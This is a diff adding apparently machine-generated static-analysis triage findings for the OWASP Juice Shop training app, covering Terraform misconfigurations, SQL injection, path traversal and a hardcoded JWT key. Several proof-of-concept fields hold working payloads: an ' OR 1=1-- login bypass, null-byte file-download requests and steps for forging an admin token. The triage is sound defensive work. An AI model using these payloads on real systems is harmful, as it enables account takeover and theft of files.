+      "triage_note": "코드픽스 스니펫; 완화 존재 — 효과는 injectionChars 정규식에 좌우.",
+      "poc": ""
+    }
+  },
+  {
+    "id": "F017",
+    "rule": "aws-subnet-has-public-ip-address",
+    "full_rule": "terraform.aws.security.aws-subnet-has-public-ip-address.aws-subnet-has-public-ip-address",
+    "path": "data/static/codefixes/iacLeakedKeyChallenge_1.tf",
+    "line": 17,
+    "endline": 29,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-1220: Insufficient Granularity of Access Control"
+    ],
+    "owasp": [
+      "A01:2021 - Broken Access Control",
+      "A01:2025 - Broken Access Control"
+    ],
+    "message": "Resources in the AWS subnet are assigned a public IP address. Resources should not be exposed on the public internet, but should have access limited to consumers required for the function of your application. Set `map_public_ip_on_launch` to false so that resources are not publicly-accessible.",
+    "code": "  13|     Environment = var.environment\n  14|   }\n  15| }\n  16| \n  17| resource \"aws_subnet\" \"public\" {\n  18|   count                   = length(var.public_subnet_cidrs)\n  19|   vpc_id                  = aws_vpc.main.id\n  20|   cidr_block              = var.public_subnet_cidrs[count.index]\n  21|   availability_zone       = data.aws_availability_zones.available.names[count.index]\n  22|   map_public_ip_on_launch = true\n  23| \n  24|   tags = {\n  25|     Name        = \"${var.project_name}-public-${count.index}\"\n  26|     Project     = var.project_name\n  27|     Environment = var.environment\n  28|   }\n  29| }\n  30| \n  31| resource \"aws_internet_gateway\" \"main\" {\n  32|   vpc_id = aws_vpc.main.id\n  33| ",
+    "triage": {
+      "verdict": "FALSE_POSITIVE",
+      "confidence": 0.75,
+      "exploitability": "NONE",
+      "reachable": "unknown",
+      "priority": "P4",
+      "category": "iac-misconfig",
+      "rationale": "리소스가 'public'으로 명명된 서브넷 — 퍼블릭 서브넷은 ALB/NAT를 위해 공인 IP가 정상적으로 필요.",
+      "evidence": "resource \"aws_subnet\" \"public\" { map_public_ip_on_launch = true }",
+      "suggested_fix": "의도된 퍼블릭 서브넷이면 조치 불필요, 설계 문서화.",
+      "triage_note": "의도적 퍼블릭 서브넷을 일반 룰이 오탐 — 전형적 IaC 오탐.",
+      "poc": ""
+    }
+  },
+  {
+    "id": "F018",
+    "rule": "insecure-load-balancer-tls-version",
+    "full_rule": "terraform.aws.security.insecure-load-balancer-tls-version.insecure-load-balancer-tls-version",
+    "path": "data/static/codefixes/iacLeakedKeyChallenge_1.tf",
+    "line": 159,
+    "endline": 159,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-326: Inadequate Encryption Strength"
+    ],
+    "owasp": [
+      "A03:2017 - Sensitive Data Exposure",
+      "A02:2021 - Cryptographic Failures",
+      "A04:2025 - Cryptographic Failures"
+    ],
+    "message": "Detected an AWS load balancer with an insecure TLS version. TLS versions less than 1.2 are considered insecure because they can be broken. To fix this, set your `ssl_policy` to `\"ELBSecurityPolicy-TLS13-1-2-Res-2021-06\"`, or include a default action to redirect to HTTPS.",
+    "code": " 155| \n 156| resource \"aws_lb_listener\" \"http\" {\n 157|   load_balancer_arn = aws_lb.juice_shop.arn\n 158|   port              = 80\n 159|   protocol          = \"HTTP\"\n 160| \n 161|   default_action {\n 162|     type             = \"forward\"\n 163|     target_group_arn = aws_lb_target_group.juice_shop.arn",
+    "triage": {
+      "verdict": "NEEDS_REVIEW",
+      "confidence": 0.6,
+      "exploitability": "MEDIUM",
+      "reachable": "unknown",
+      "priority": "P3",
+      "category": "iac-misconfig",
+      "rationale": "forward(리다이렉트 아님) 액션의 HTTP:80 ALB 리스너 — 평문 트래픽.",
+      "evidence": "aws_lb_listener \"http\" { port=80 protocol=\"HTTP\" ... type=\"forward\" }",
+      "suggested_fix": "80→443 리다이렉트, 또는 리스너에 TLS1.2+ 종단.",
+      "triage_note": "별도 443 리스너 존재 여부와 80이 리다이렉트 의도인지 확인 필요.",
+      "poc": "평문 HTTP:80 리스너 → 유선상 도청/MITM 가능."
+    }
+  },
+  {
+    "id": "F019",
+    "rule": "aws-subnet-has-public-ip-address",
+    "full_rule": "terraform.aws.security.aws-subnet-has-public-ip-address.aws-subnet-has-public-ip-address",
+    "path": "data/static/codefixes/iacLeakedKeyChallenge_2.tf",
+    "line": 17,
+    "endline": 29,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-1220: Insufficient Granularity of Access Control"
+    ],
+    "owasp": [
+      "A01:2021 - Broken Access Control",
+      "A01:2025 - Broken Access Control"
+    ],
+    "message": "Resources in the AWS subnet are assigned a public IP address. Resources should not be exposed on the public internet, but should have access limited to consumers required for the function of your application. Set `map_public_ip_on_launch` to false so that resources are not publicly-accessible.",
+    "code": "  13|     Environment = var.environment\n  14|   }\n  15| }\n  16| \n  17| resource \"aws_subnet\" \"public\" {\n  18|   count                   = length(var.public_subnet_cidrs)\n  19|   vpc_id                  = aws_vpc.main.id\n  20|   cidr_block              = var.public_subnet_cidrs[count.index]\n  21|   availability_zone       = data.aws_availability_zones.available.names[count.index]\n  22|   map_public_ip_on_launch = true\n  23| \n  24|   tags = {\n  25|     Name        = \"${var.project_name}-public-${count.index}\"\n  26|     Project     = var.project_name\n  27|     Environment = var.environment\n  28|   }\n  29| }\n  30| \n  31| resource \"aws_internet_gateway\" \"main\" {\n  32|   vpc_id = aws_vpc.main.id\n  33| ",
+    "triage": {
+      "verdict": "FALSE_POSITIVE",
+      "confidence": 0.75,
+      "exploitability": "NONE",
+      "reachable": "unknown",
+      "priority": "P4",
+      "category": "iac-misconfig",
+      "rationale": "의도적 'public' 서브넷 (challenge_2 변형).",
+      "evidence": "\"public\" 서브넷, map_public_ip_on_launch = true",
+      "suggested_fix": "의도된 것이면 조치 불필요.",
+      "triage_note": "F017과 동일한 설계 의도 패턴.",
+      "poc": ""
+    }
+  },
+  {
+    "id": "F020",
+    "rule": "insecure-load-balancer-tls-version",
+    "full_rule": "terraform.aws.security.insecure-load-balancer-tls-version.insecure-load-balancer-tls-version",
+    "path": "data/static/codefixes/iacLeakedKeyChallenge_2.tf",
+    "line": 159,
+    "endline": 159,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-326: Inadequate Encryption Strength"
+    ],
+    "owasp": [
+      "A03:2017 - Sensitive Data Exposure",
+      "A02:2021 - Cryptographic Failures",
+      "A04:2025 - Cryptographic Failures"
+    ],
+    "message": "Detected an AWS load balancer with an insecure TLS version. TLS versions less than 1.2 are considered insecure because they can be broken. To fix this, set your `ssl_policy` to `\"ELBSecurityPolicy-TLS13-1-2-Res-2021-06\"`, or include a default action to redirect to HTTPS.",
+    "code": " 155| \n 156| resource \"aws_lb_listener\" \"http\" {\n 157|   load_balancer_arn = aws_lb.juice_shop.arn\n 158|   port              = 80\n 159|   protocol          = \"HTTP\"\n 160| \n 161|   default_action {\n 162|     type             = \"forward\"\n 163|     target_group_arn = aws_lb_target_group.juice_shop.arn",
+    "triage": {
+      "verdict": "NEEDS_REVIEW",
+      "confidence": 0.6,
+      "exploitability": "MEDIUM",
+      "reachable": "unknown",
+      "priority": "P3",
+      "category": "iac-misconfig",
+      "rationale": "HTTP:80 forward 리스너 (challenge_2 변형).",
+      "evidence": "port=80 protocol=\"HTTP\" type=\"forward\"",
+      "suggested_fix": "80→443 리다이렉트.",
+      "triage_note": "F018과 동일.",
+      "poc": "평문 HTTP:80 리스너 → 도청/MITM."
+    }
+  },
+  {
+    "id": "F021",
+    "rule": "aws-subnet-has-public-ip-address",
+    "full_rule": "terraform.aws.security.aws-subnet-has-public-ip-address.aws-subnet-has-public-ip-address",
+    "path": "data/static/codefixes/iacLeakedKeyChallenge_3_correct.tf",
+    "line": 17,
+    "endline": 29,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-1220: Insufficient Granularity of Access Control"
+    ],
+    "owasp": [
+      "A01:2021 - Broken Access Control",
+      "A01:2025 - Broken Access Control"
+    ],
+    "message": "Resources in the AWS subnet are assigned a public IP address. Resources should not be exposed on the public internet, but should have access limited to consumers required for the function of your application. Set `map_public_ip_on_launch` to false so that resources are not publicly-accessible.",
+    "code": "  13|     Environment = var.environment\n  14|   }\n  15| }\n  16| \n  17| resource \"aws_subnet\" \"public\" {\n  18|   count                   = length(var.public_subnet_cidrs)\n  19|   vpc_id                  = aws_vpc.main.id\n  20|   cidr_block              = var.public_subnet_cidrs[count.index]\n  21|   availability_zone       = data.aws_availability_zones.available.names[count.index]\n  22|   map_public_ip_on_launch = true\n  23| \n  24|   tags = {\n  25|     Name        = \"${var.project_name}-public-${count.index}\"\n  26|     Project     = var.project_name\n  27|     Environment = var.environment\n  28|   }\n  29| }\n  30| \n  31| resource \"aws_internet_gateway\" \"main\" {\n  32|   vpc_id = aws_vpc.main.id\n  33| ",
+    "triage": {
+      "verdict": "FALSE_POSITIVE",
+      "confidence": 0.85,
+      "exploitability": "NONE",
+      "reachable": "unknown",
+      "priority": "P4",
+      "category": "iac-misconfig",
+      "rationale": "파일명이 iacLeakedKeyChallenge_3_correct.tf — '정답' 참조 파일인데도 일반 룰에 걸림.",
+      "evidence": "_correct.tf 에도 \"public\" 서브넷 map_public_ip_on_launch = true",
+      "suggested_fix": "조치 불필요; 참조-정답 파일.",
+      "triage_note": "교과서적 오탐: 문맥을 못 보는 룰이 '정답'을 걸어냄.",
+      "poc": ""
+    }
+  },
+  {
+    "id": "F022",
+    "rule": "insecure-load-balancer-tls-version",
+    "full_rule": "terraform.aws.security.insecure-load-balancer-tls-version.insecure-load-balancer-tls-version",
+    "path": "data/static/codefixes/iacLeakedKeyChallenge_3_correct.tf",
+    "line": 159,
+    "endline": 159,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-326: Inadequate Encryption Strength"
+    ],
+    "owasp": [
+      "A03:2017 - Sensitive Data Exposure",
+      "A02:2021 - Cryptographic Failures",
+      "A04:2025 - Cryptographic Failures"
+    ],
+    "message": "Detected an AWS load balancer with an insecure TLS version. TLS versions less than 1.2 are considered insecure because they can be broken. To fix this, set your `ssl_policy` to `\"ELBSecurityPolicy-TLS13-1-2-Res-2021-06\"`, or include a default action to redirect to HTTPS.",
+    "code": " 155| \n 156| resource \"aws_lb_listener\" \"http\" {\n 157|   load_balancer_arn = aws_lb.juice_shop.arn\n 158|   port              = 80\n 159|   protocol          = \"HTTP\"\n 160| \n 161|   default_action {\n 162|     type             = \"forward\"\n 163|     target_group_arn = aws_lb_target_group.juice_shop.arn",
+    "triage": {
+      "verdict": "FALSE_POSITIVE",
+      "confidence": 0.7,
+      "exploitability": "LOW",
+      "reachable": "unknown",
+      "priority": "P4",
+      "category": "iac-misconfig",
+      "rationale": "*_correct.tf 참조 파일의 HTTP:80 리스너.",
+      "evidence": "_correct.tf, port=80 HTTP 리스너",
+      "suggested_fix": "조치 불필요; 참조 파일.",
+      "triage_note": "의도된 정답 파일 — 오탐/노이즈로 처리.",
+      "poc": ""
+    }
+  },
+  {
+    "id": "F023",
+    "rule": "express-sequelize-injection",
+    "full_rule": "javascript.sequelize.security.audit.sequelize-injection-express.express-sequelize-injection",
+    "path": "data/static/codefixes/unionSqlInjectionChallenge_1.ts",
+    "line": 6,
+    "endline": 6,
+    "severity": "ERROR",
+    "cwe": [
+      "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
+    ],
+    "owasp": [
+      "A01:2017 - Injection",
+      "A03:2021 - Injection",
+      "A05:2025 - Injection"
+    ],
+    "message": "Detected a sequelize statement that is tainted by user-input. This could lead to SQL injection if the variable is user-controlled and is not properly sanitized. In order to prevent SQL injection, it is recommended to use parameterized queries or prepared statements.",
+    "code": "   2|   return (req: Request, res: Response, next: NextFunction) => {\n   3|     let criteria: any = req.query.q === 'undefined' ? '' : req.query.q ?? ''\n   4|     criteria = (criteria.length <= 200) ? criteria : criteria.substring(0, 200)\n   5|     criteria.replace(/\"|'|;|and|or/i, \"\")\n   6|     models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)\n   7|       .then(([products]: any) => {\n   8|         const dataString = JSON.stringify(products)\n   9|         for (let i = 0; i < products.length; i++) {\n  10|           products[i].name = req.__(products[i].name)",
+    "triage": {
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.8,
+      "exploitability": "LOW",
+      "reachable": "false",
+      "priority": "P3",
+      "category": "sql-injection",
+      "rationale": "새니타이저가 무효(no-op): criteria.replace(...) 반환값을 버려서 criteria가 그대로 주입 가능.",
+      "evidence": "criteria.replace(/\"|'|;|and|or/i,\"\")  // 반환값 미할당",
+      "suggested_fix": "파라미터화; 블록리스트 replace 의존 금지.",
+      "triage_note": "깨진 완화 TP. 코드픽스 스니펫(라이브 라우트 아님).",
+      "poc": "F035 와 동일한 SQLi 유형이나, 이 파일은 코드픽스 훈련 스니펫 — 마운트된 라우트가 아니므로 공격할 라이브 엔드포인트가 없음."
+    }
+  },
+  {
+    "id": "F024",
+    "rule": "express-sequelize-injection",
+    "full_rule": "javascript.sequelize.security.audit.sequelize-injection-express.express-sequelize-injection",
+    "path": "data/static/codefixes/unionSqlInjectionChallenge_3.ts",
+    "line": 10,
+    "endline": 10,
+    "severity": "ERROR",
+    "cwe": [
+      "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
+    ],
+    "owasp": [
+      "A01:2017 - Injection",
+      "A03:2021 - Injection",
+      "A05:2025 - Injection"
+    ],
+    "message": "Detected a sequelize statement that is tainted by user-input. This could lead to SQL injection if the variable is user-controlled and is not properly sanitized. In order to prevent SQL injection, it is recommended to use parameterized queries or prepared statements.",
+    "code": "   6|     if (!criteria.startsWith(\"apple\") || !criteria.startsWith(\"orange\")) {\n   7|       res.status(400).send()\n   8|       return\n   9|     }\n  10|     models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)\n  11|       .then(([products]: any) => {\n  12|         const dataString = JSON.stringify(products)\n  13|         for (let i = 0; i < products.length; i++) {\n  14|           products[i].name = req.__(products[i].name)",
+    "triage": {
+      "verdict": "NEEDS_REVIEW",
+      "confidence": 0.5,
+      "exploitability": "LOW",
+      "reachable": "false",
+      "priority": "P4",
+      "category": "sql-injection",
+      "rationale": "가드 `!startsWith('apple') || !startsWith('orange')` 는 항상 참이라 모든 입력이 400 — 공격 입력으로는 싱크 도달 불가.",
+      "evidence": "if (!criteria.startsWith('apple') || !criteria.startsWith('orange')) { 400 }",
+      "suggested_fix": "어쨌든 쿼리 파라미터화.",
+      "triage_note": "과잉 차단 로직으로 실제 악용 어려움; 코드픽스 스니펫.",
+      "poc": ""
+    }
+  },
+  {
+    "id": "F025",
+    "rule": "npm-missing-minimum-release-age",
+    "full_rule": "package_managers.npm.npm-missing-minimum-release-age.npm-missing-minimum-release-age",
+    "path": "frontend/.npmrc",
+    "line": 1,
+    "endline": 1,
+    "severity": "MEDIUM",
+    "cwe": [
+      "CWE-829: Inclusion of Functionality from Untrusted Control Sphere"
+    ],
+    "owasp": [
+      "A08:2021 - Software and Data Integrity Failures"
+    ],
+    "message": "This .npmrc does not set a minimum release age or sets it too low. Newly published packages can be malicious or unstable. Add `min-release-age = 7` to wait 7 days before resolving newly published package versions. Added in: v11.10 Reference: https://github.blog/changelog/2026-02-18-npm-bulk-trusted-publishing-config-and-script-security-now-generally-available/",
+    "code": "   1| package-lock=false",
+    "triage": {
+      "verdict": "NEEDS_REVIEW",
+      "confidence": 0.5,
+      "exploitability": "LOW",
+      "reachable": "unknown",
+      "priority": "P4",
+      "category": "supply-chain",
+      "rationale": "frontend/.npmrc 에 min-release-age 없음 (F014와 동일 하드닝 룰).",
+      "evidence": "package-lock=false",
+      "suggested_fix": "정책상 필요하면 min-release-age 추가.",
+      "triage_note": "정보성; 프론트엔드 패키지에 대한 F014 중복.",
+      "poc": ""
+    }
+  },
+  {
+    "id": "F026",
+    "rule": "aws-subnet-has-public-ip-address",
+    "full_rule": "terraform.aws.security.aws-subnet-has-public-ip-address.aws-subnet-has-public-ip-address",
+    "path": "infrastructure/terraform/networking.tf",
+    "line": 18,
+    "endline": 30,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-1220: Insufficient Granularity of Access Control"
+    ],
+    "owasp": [
+      "A01:2021 - Broken Access Control",
+      "A01:2025 - Broken Access Control"
+    ],
+    "message": "Resources in the AWS subnet are assigned a public IP address. Resources should not be exposed on the public internet, but should have access limited to consumers required for the function of your application. Set `map_public_ip_on_launch` to false so that resources are not publicly-accessible.",
+    "code": "  14|     Environment = var.environment\n  15|   }\n  16| }\n  17| \n  18| resource \"aws_subnet\" \"public\" {\n  19|   count                   = length(var.public_subnet_cidrs)\n  20|   vpc_id                  = aws_vpc.main.id\n  21|   cidr_block              = var.public_subnet_cidrs[count.index]\n  22|   availability_zone       = data.aws_availability_zones.available.names[count.index]\n  23|   map_public_ip_on_launch = true\n  24| \n  25|   tags = {\n  26|     Name        = \"${var.project_name}-public-${count.index}\"\n  27|     Project     = var.project_name\n  28|     Environment = var.environment\n  29|   }\n  30| }\n  31| \n  32| resource \"aws_internet_gateway\" \"main\" {\n  33|   vpc_id = aws_vpc.main.id\n  34| ",
+    "triage": {
+      "verdict": "FALSE_POSITIVE",
+      "confidence": 0.75,
+      "exploitability": "NONE",
+      "reachable": "unknown",
+      "priority": "P4",
+      "category": "iac-misconfig",
+      "rationale": "infrastructure/terraform 의 의도적 'public' 서브넷.",
+      "evidence": "\"public\" 서브넷, map_public_ip_on_launch = true",
+      "suggested_fix": "의도된 것이면 조치 불필요.",
+      "triage_note": "설계상 퍼블릭 서브넷.",
+      "poc": ""
+    }
+  },
+  {
+    "id": "F027",
+    "rule": "insecure-load-balancer-tls-version",
+    "full_rule": "terraform.aws.security.insecure-load-balancer-tls-version.insecure-load-balancer-tls-version",
+    "path": "infrastructure/terraform/networking.tf",
+    "line": 160,
+    "endline": 160,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-326: Inadequate Encryption Strength"
+    ],
+    "owasp": [
+      "A03:2017 - Sensitive Data Exposure",
+      "A02:2021 - Cryptographic Failures",
+      "A04:2025 - Cryptographic Failures"
+    ],
+    "message": "Detected an AWS load balancer with an insecure TLS version. TLS versions less than 1.2 are considered insecure because they can be broken. To fix this, set your `ssl_policy` to `\"ELBSecurityPolicy-TLS13-1-2-Res-2021-06\"`, or include a default action to redirect to HTTPS.",
+    "code": " 156| \n 157| resource \"aws_lb_listener\" \"http\" {\n 158|   load_balancer_arn = aws_lb.juice_shop.arn\n 159|   port              = 80\n 160|   protocol          = \"HTTP\"\n 161| \n 162|   default_action {\n 163|     type             = \"forward\"\n 164|     target_group_arn = aws_lb_target_group.juice_shop.arn",
+    "triage": {
+      "verdict": "NEEDS_REVIEW",
+      "confidence": 0.6,
+      "exploitability": "MEDIUM",
+      "reachable": "unknown",
+      "priority": "P3",
+      "category": "iac-misconfig",
+      "rationale": "infrastructure/terraform 의 HTTP:80 forward 리스너.",
+      "evidence": "port=80 protocol=\"HTTP\" type=\"forward\"",
+      "suggested_fix": "80→443 리다이렉트.",
+      "triage_note": "리다이렉트 의도 확인 필요.",
+      "poc": "평문 HTTP:80 리스너 → 도청/MITM."
+    }
+  },
+  {
+    "id": "F028",
+    "rule": "hardcoded-jwt-secret",
+    "full_rule": "javascript.jsonwebtoken.security.jwt-hardcode.hardcoded-jwt-secret",
+    "path": "lib/insecurity.ts",
+    "line": 54,
+    "endline": 54,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-798: Use of Hard-coded Credentials"
+    ],
+    "owasp": [
+      "A07:2021 - Identification and Authentication Failures",
+      "A07:2025 - Authentication Failures"
+    ],
+    "message": "A hard-coded credential was detected. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).",
+    "code": "  50| }\n  51| \n  52| export const isAuthorized = () => expressJwt(({ secret: publicKey }) as any)\n  53| export const denyAll = () => expressJwt({ secret: '' + Math.random() } as any)\n  54| export const authorize = (user = {}) => jwt.sign(user, privateKey, { expiresIn: '6h', algorithm: 'RS256' })\n  55| export const verify = (token: string) => token ? (jws.verify as ((token: string, secret: string) => boolean))(token, publicKey) : false\n  56| export const decode = (token: string) => { return jws.decode(token)?.payload }\n  57| \n  58| export const sanitizeHtml = (html: string) => sanitizeHtmlLib(html)",
+    "triage": {
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.9,
+      "exploitability": "HIGH",
+      "reachable": "true",
+      "priority": "P1",
+      "category": "hardcoded-secret",
+      "rationale": "JWT를 RS256으로 서명하는 privateKey를 Juice Shop이 리포지토리(encryptionkeys/)에 커밋 — 서명키가 사실상 공개라 공격자가 유효 토큰을 위조해 권한 상승 가능.",
+      "evidence": "jwt.sign(user, privateKey, { algorithm: 'RS256' }) — 리포지토리 내 개인키 사용",
+      "suggested_fix": "개인키를 시크릿 저장소/HSM에서 로드하고 커밋된 키 폐기·교체.",
+      "triage_note": "실제 고위험 인증 결함(JWT 위조). 룰은 sign() 호출에 걸렸지만 진짜 원인은 커밋된 키 자체.",
+      "poc": "encryptionkeys/ 에 커밋된 개인키로 admin JWT 위조:\n  header  {\"alg\":\"RS256\",\"typ\":\"JWT\"}\n  payload {\"data\":{\"email\":\"admin@juice-sh.op\",\"role\":\"admin\"}}\n  리포지토리 내 RSA 개인키로 서명 후:\n  Authorization: Bearer <위조토큰>   → admin 으로 인증됨."
+    }
+  },
+  {
+    "id": "F029",
+    "rule": "express-res-sendfile",
+    "full_rule": "javascript.express.security.audit.express-res-sendfile.express-res-sendfile",
+    "path": "routes/fileServer.ts",
+    "line": 32,
+    "endline": 32,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-73: External Control of File Name or Path"
+    ],
+    "owasp": [
+      "A04:2021 - Insecure Design",
+      "A06:2025 - Insecure Design"
+    ],
+    "message": "The application processes user-input, this is passed to res.sendFile which can allow an attacker to arbitrarily read files on the system through path traversal. It is recommended to perform input validation in addition to canonicalizing the path. This allows you to validate the path against the intended directory it should be accessing.",
+    "code": "  28| \n  29|       challengeUtils.solveIf(challenges.directoryListingChallenge, () => { return file.toLowerCase() === 'acquisitions.md' })\n  30|       verifySuccessfulPoisonNullByteExploit(file)\n  31| \n  32|       res.sendFile(path.resolve('ftp/', file))\n  33|     } else {\n  34|       res.status(403)\n  35|       next(new Error('Only .md and .pdf files are allowed!'))\n  36|     }",
+    "triage": {
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.9,
+      "exploitability": "HIGH",
+      "reachable": "true",
+      "priority": "P1",
+      "category": "path-traversal",
+      "rationale": "사용자 file 이 슬래시 가드 없이 res.sendFile 로 전달; poison null byte 처리 코드가 의도된 임의 파일 읽기임을 방증.",
+      "evidence": "res.sendFile(path.resolve('ftp/', file)) + verifySuccessfulPoisonNullByteExploit(file)",
+      "suggested_fix": "경로 정규화 후 의도 디렉터리 내부인지 검증; 파일명 허용목록 검증.",
+      "triage_note": "유효한 완화 없음(F030/F031/F033과 달리) — sendFile 군에서 가장 위험.",
+      "poc": "poison null byte 로 .md/.pdf 허용검사 우회:\n  GET /ftp/package.json%2500.md          → package.json 다운로드\n  GET /ftp/eastere.gg%2500.md"
+    }
+  },
+  {
+    "id": "F030",
+    "rule": "express-res-sendfile",
+    "full_rule": "javascript.express.security.audit.express-res-sendfile.express-res-sendfile",
+    "path": "routes/keyServer.ts",
+    "line": 14,
+    "endline": 14,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-73: External Control of File Name or Path"
+    ],
+    "owasp": [
+      "A04:2021 - Insecure Design",
+      "A06:2025 - Insecure Design"
+    ],
+    "message": "The application processes user-input, this is passed to res.sendFile which can allow an attacker to arbitrarily read files on the system through path traversal. It is recommended to perform input validation in addition to canonicalizing the path. This allows you to validate the path against the intended directory it should be accessing.",
+    "code": "  10|   return ({ params }: Request, res: Response, next: NextFunction) => {\n  11|     const file = params.file\n  12| \n  13|     if (!file.includes('/')) {\n  14|       res.sendFile(path.resolve('encryptionkeys/', file))\n  15|     } else {\n  16|       res.status(403)\n  17|       next(new Error('File names cannot contain forward slashes!'))\n  18|     }",
+    "triage": {
+      "verdict": "NEEDS_REVIEW",
+      "confidence": 0.6,
+      "exploitability": "LOW",
+      "reachable": "true",
+      "priority": "P3",
+      "category": "path-traversal",
+      "rationale": "사용자 file 의 res.sendFile 이지만 `!file.includes('/')` 가드로 ../ 디렉터리 이탈 차단.",
+      "evidence": "if (!file.includes('/')) { res.sendFile(path.resolve('encryptionkeys/', file)) }",
+      "suggested_fix": "정규화 + 접두 경로 검증 추가.",
+      "triage_note": "슬래시 가드로 디렉터리 이탈 완화; 잔여 위험은 encryptionkeys/ 내부 파일에 한정. F029보다 낮음.",
+      "poc": "슬래시 가드가 ../ 이탈 차단; encryptionkeys/ 내부 파일에 한정:\n  GET /encryptionkeys/  후 GET /encryptionkeys/<나열된 파일>   (디렉터리 이탈 불가)"
+    }
+  },
+  {
+    "id": "F031",
+    "rule": "express-res-sendfile",
+    "full_rule": "javascript.express.security.audit.express-res-sendfile.express-res-sendfile",
+    "path": "routes/logfileServer.ts",
+    "line": 14,
+    "endline": 14,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-73: External Control of File Name or Path"
+    ],
+    "owasp": [
+      "A04:2021 - Insecure Design",
+      "A06:2025 - Insecure Design"
+    ],
+    "message": "The application processes user-input, this is passed to res.sendFile which can allow an attacker to arbitrarily read files on the system through path traversal. It is recommended to perform input validation in addition to canonicalizing the path. This allows you to validate the path against the intended directory it should be accessing.",
+    "code": "  10|   return ({ params }: Request, res: Response, next: NextFunction) => {\n  11|     const file = params.file\n  12| \n  13|     if (!file.includes('/')) {\n  14|       res.sendFile(path.resolve('logs/', file))\n  15|     } else {\n  16|       res.status(403)\n  17|       next(new Error('File names cannot contain forward slashes!'))\n  18|     }",
+    "triage": {
+      "verdict": "NEEDS_REVIEW",
+      "confidence": 0.6,
+      "exploitability": "LOW",
+      "reachable": "true",
+      "priority": "P3",
+      "category": "path-traversal",
+      "rationale": "logs sendFile 에 동일한 `!file.includes('/')` 가드.",
+      "evidence": "if (!file.includes('/')) { res.sendFile(path.resolve('logs/', file)) }",
+      "suggested_fix": "정규화 + 접두 검증.",
+      "triage_note": "F030처럼 완화됨.",
+      "poc": "슬래시 가드가 이탈 차단; logs/ 디렉터리에만 한정."
+    }
+  },
+  {
+    "id": "F032",
+    "rule": "express-sequelize-injection",
+    "full_rule": "javascript.sequelize.security.audit.sequelize-injection-express.express-sequelize-injection",
+    "path": "routes/login.ts",
+    "line": 34,
+    "endline": 34,
+    "severity": "ERROR",
+    "cwe": [
+      "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
+    ],
+    "owasp": [
+      "A01:2017 - Injection",
+      "A03:2021 - Injection",
+      "A05:2025 - Injection"
+    ],
+    "message": "Detected a sequelize statement that is tainted by user-input. This could lead to SQL injection if the variable is user-controlled and is not properly sanitized. In order to prevent SQL injection, it is recommended to use parameterized queries or prepared statements.",
+    "code": "  30|   }\n  31| \n  32|   return (req: Request, res: Response, next: NextFunction) => {\n  33|     verifyPreLoginChallenges(req) // vuln-code-snippet hide-line\n  34|     models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true }) // vuln-code-snippet vuln-line loginAdminChallenge loginBenderChallenge loginJimChallenge\n  35|       .then((authenticatedUser) => { // vuln-code-snippet neutral-line loginAdminChallenge loginBenderChallenge loginJimChallenge\n  36|         const user = utils.queryResultToJson(authenticatedUser)\n  37|         if (user.data?.id && user.data.totpSecret !== '') {\n  38|           res.status(401).json({",
+    "triage": {
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.98,
+      "exploitability": "HIGH",
+      "reachable": "true",
+      "priority": "P1",
+      "category": "sql-injection",
+      "rationale": "req.body.email 이 로그인 라우트의 원시 SQL WHERE 절에 그대로 접합 — 전형적 인증우회 SQLi (' OR 1=1--).",
+      "evidence": "sequelize.query(`... WHERE email = '${req.body.email}' ...`)",
+      "suggested_fix": "파라미터화 replacements 사용; 요청 본문으로 SQL 문자열 생성 금지.",
+      "triage_note": "Juice Shop 대표 로그인 SQLi. 라이브·외부·인증 전 단계 — 최우선.",
+      "poc": "email 필드 SQLi 로 인증 우회:\n  POST /rest/user/login\n  {\"email\":\"' OR 1=1--\",\"password\":\"x\"}      → 첫 사용자(admin)로 로그인\n  또는  {\"email\":\"admin@juice-sh.op'--\", ...}"
+    }
+  },
+  {
+    "id": "F033",
+    "rule": "express-res-sendfile",
+    "full_rule": "javascript.express.security.audit.express-res-sendfile.express-res-sendfile",
+    "path": "routes/quarantineServer.ts",
+    "line": 14,
+    "endline": 14,
+    "severity": "WARNING",
+    "cwe": [
+      "CWE-73: External Control of File Name or Path"
+    ],
+    "owasp": [
+      "A04:2021 - Insecure Design",
+      "A06:2025 - Insecure Design"
+    ],
+    "message": "The application processes user-input, this is passed to res.sendFile which can allow an attacker to arbitrarily read files on the system through path traversal. It is recommended to perform input validation in addition to canonicalizing the path. This allows you to validate the path against the intended directory it should be accessing.",
+    "code": "  10|   return ({ params, query }: Request, res: Response, next: NextFunction) => {\n  11|     const file = params.file\n  12| \n  13|     if (!file.includes('/')) {\n  14|       res.sendFile(path.resolve('ftp/quarantine/', file))\n  15|     } else {\n  16|       res.status(403)\n  17|       next(new Error('File names cannot contain forward slashes!'))\n  18|     }",
+    "triage": {
+      "verdict": "NEEDS_REVIEW",
+      "confidence": 0.6,
+      "exploitability": "LOW",
+      "reachable": "true",
+      "priority": "P3",
+      "category": "path-traversal",
